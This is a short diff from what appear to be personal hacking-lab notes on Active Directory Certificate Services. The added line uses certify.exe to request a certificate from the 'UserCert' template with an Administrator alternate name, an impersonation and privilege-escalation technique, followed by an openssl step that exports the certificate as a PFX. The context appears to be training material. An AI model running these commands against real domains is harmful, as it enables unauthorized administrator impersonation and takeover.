@@ -49,6 +49,9 @@ CA Name                               : PKI.eagle.local\eagle-PKI-CA
     pkiextendedkeyusage                   : Client Authentication
  request 
 
+certify.exe request /ca:PKI.eagle.local\eagle-PKI-CA CA /template:UserCert /altname:Administrator
+
+
  openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
 
   /drive:linux,/home/kaliwork/workspace/hacklab/academy/Attackwindows
